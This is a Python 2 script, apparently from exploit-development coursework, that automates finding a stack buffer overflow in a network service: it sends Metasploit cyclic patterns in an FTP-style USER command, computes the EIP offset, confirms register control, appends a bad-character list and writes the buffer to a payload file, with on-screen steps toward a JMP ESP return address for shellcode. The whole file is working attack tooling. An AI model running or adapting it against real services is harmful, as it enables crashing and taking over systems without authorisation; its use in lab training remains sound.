#!/usr/bin/python
# REV3
from __future__ import print_function
from sys import stdout
import socket
import time
import sys
import os

# CHECK FOR CORRECT NUMBER OF ARGUMENTS =================================================
if len(sys.argv) != 3:
    print('[TEST_FOR_OVERFLOW_LOCATION]')
    print('[Usage]: python cspeakes_buffer.py <target_ip> <target_port>')
    exit()

# GLOBAL VARIABLES ======================================================================
ip_addr = sys.argv[1] # IP Addr we are pointing to
STATIC_LEN = 6000 # Max buffer we are testing for
port = int(sys.argv[2]) # Port to send the payload to
reg_word_test = '' # User Defined Later in the program
register_candidate = '' # User Defined STR used for final report only
second_offset = '' # Used to derive distance from offset to second_offset
bad_chars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )


# CUSTOM FUNCTIONS ======================================================================
def send_var(var):
    try:
        start_time = time.time()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10.0) # Timeout in seconds (S)
        connect = s.connect((ip_addr,port))
        s.recv(1024)
        s.send('USER ' + str(var) + '\r\n') # <REFACTOR> if target requires different syntax/proto
        s.recv(1024)
        #s.send('PASS ' + var + '\r\n') # <REFACTOR> if target requires different syntax/proto
        #s.send('QUIT\r\n') # <REFACTOR> if target requires different syntax/proto
        s.close()
        print('Success! Maybe....\n')
    except socket.timeout:
        print("Connection Timed Out!")
        exit()


def print_initial_output(offset, EIP_REG_0, ascii_location, B, U, FF, ER):
    msg = '# =============================================================\n'
    msg += '# Current Offset:  ' + str(offset) + '\n'
    msg += '# EIP register\'s value @Crash: ' + str(EIP_REG_0) + '\n'
    msg += '# EIP register Value :  ' + B + U + FF + ER + '\n'
    msg += '# From Big to Little Endian:  ' + ER + FF + U + B + '\n'
    print(msg)


def continue_msg():
    msg = '\n# ***************************\n'
    msg += 'Perform the following steps before moving onward:\n'
    msg += '1. Reboot [WINDOWS]\n2. Open Immunity\n'
    msg += '3. Attach to the target process\n4. Un-pause Immunity\n'
    msg += 'Please type "go" when you have completed these steps'
    msg += 'or type "cancel" to exit the program\n'
    msg += '# ***************************\n'
    response = raw_input(msg)
    response = response.lower()
    if response == 'cancel':
        exit(0)
    elif response == 'go':
        pass
    while response != 'go':
        try_again = 'Please type only "go" to continue or "cancel" to stop everything:\n'
        response = raw_input(try_again)
        if response == 'cancel':
            exit(0)

def increase_len_msg():
    global STATIC_LEN
    msg = '# =============================================================\n'
    msg += 'Your current buffer length is set to 6000 bytes.\n'
    msg += 'Would you like to increase that to widen the buffer? (Y|N)\n'
    response = raw_input(msg)
    response = response.lower()
    if response == 'y' or response == 'yes':
        msg = 'Please enter the length in ascii characters you would like:\n'
        msg += '\t***Remember*** each ascii character == 1 byte ******\n'
        try:
            response = raw_input(msg)
            output = int(response)
        except:
            output = 'error'
    else:
        output = STATIC_LEN
    return output


def main():
    global register_candidate
    global STATIC_LEN
    global bad_chars

    print('STEP 0 ==================================================')
    intro_msg = '[TESTING FOR OVERFLOW LOCATION to LENGTH == ' + str(STATIC_LEN) + ']\n'
    print(intro_msg)
    sys_command = '/usr/share/metasploit-framework/'
    sys_command += 'tools/exploit/pattern_create.rb -l ' + str(STATIC_LEN)
    print('The command used to generate random, non-repeating string is:')
    print(sys_command)
    var = os.popen(sys_command).read()
    send_var(var)
    EIP_REG = raw_input('Please input the EIP Register value the program failed on: ')

    print('\nSTEP 1 ==================================================')
    B = str(EIP_REG[:2].lower())
    U = str(EIP_REG[2:4].lower())
    FF = str(EIP_REG[4:6].lower())
    ER = str(EIP_REG[6:8].lower())

    ascii_location = str(chr(int(ER,16))) + str(chr(int(FF,16))) + \
    str(chr(int(U,16))) + str(chr(int(B,16)))

    sys_command = '/usr/share/metasploit-framework/'
    sys_command += 'tools/exploit/pattern_offset.rb -l '
    sys_command += str(STATIC_LEN) + ' -q ' + str(ascii_location)
    sys_command_output = os.popen(sys_command).read()
    offset = sys_command_output.split(' ')
    offset = int(offset[len(offset) - 1].strip('\n'))

    print_initial_output(offset, EIP_REG, ascii_location, B, U, FF, ER)
    print('STEP 2 ==================================================\n')

    test_chars = raw_input('Please input 4 ASCII Chars for testing offset: ')
    reg_word_test = str(test_chars)

    _buffer = []
    for char in test_chars:
        _buffer.append(char.encode('hex'))

        B = str(_buffer[0])
        U = str(_buffer[1])
        FF = str(_buffer[2])
        ER = str(_buffer[3])

        B_U_FF_ER = B + U + FF + ER
        ER_FF_U_B = ER + FF + U + B

    new_var = ('A' * offset) + str(reg_word_test) + ('C' * 90)
    msg = 'The updated variable now becomes....\n'
    msg += "new_var = (\'A\' * offset) + \"" +  str(reg_word_test)
    msg += "\" + (\'C\' * 90)\n\n"
    continue_msg()

    print('STEP 3 ==================================================\n')
    send_var(new_var)
    msg = '[CONFIRM HERE] - Your EIP register should read: ' + str(ER_FF_U_B) + '\n'
    msg += 'Look for any Register containing an address that points to the beginning,\n'
    msg += 'or anywhere remotely close to the beginning of your [A] or [C] buffer zones.\n'
    msg += 'This will be a good spot, to most likely place our shellcode.\n'
    msg += '\n*** ALSO NOTE Make sure we have at least 400 bytes between this addr\n'
    msg += 'and the end of your total buffer. (ie. last addr of last [C] buffer component)\n'
    msg += 'Otherwise, you need to incrase the "length" variable found in "configuration"\n\n'
    print(msg)

    new_len = increase_len_msg()
    while new_len == 'error':
        new_len = increase_len_msg()

    # POTENTIAL REFACTOR might be needed here if there is a different target
    payload = ('A' * offset) + str(reg_word_test) + bad_chars + ((new_len - STATIC_LEN) * 'C')
    msg = 'The updated variable now becomes....\n'
    msg += "new_var = (\'A\' * offset) + \"" +  str(reg_word_test)
    msg += "\" + bad_chars)\n\n"
    msg += '\t***Please note, final buffer written to \"cs.payload\"\n'
    msg += '\t***Also, the bad_chars were added to aide in the next step.\n'
    f_out = open('cs.payload','w')
    f_out.write(payload)
    f_out.close()
    print(msg)

    print('==============PROCEED TO NEXT CSPEAKES SCRIPT==================\n')
    msg = 'You must now focus!\nYou now have to find a good return address.\n'
    msg += 'to replace into the EIP register. This address should point to near\n'
    msg += 'the beginning of one of your A or C buffers but leaves 350-400 bytes.\n'
    msg += 'REMEMBER THE BOOK: "If we can find an accessible, reliable address in\n'
    msg += 'memory that contains an instruction such as JMP ESP, we could jump to it,\n'
    msg += 'and in turn end up at the address pointed to, by the ESP register, at the time of the jump\n\n'
    msg += 'Time to use .... cspeakes_badCharTest.py\n\nThis will help find bad chars.\n\nGodspeed!\n\n'
    print(msg)


if __name__ == "__main__":
    main()
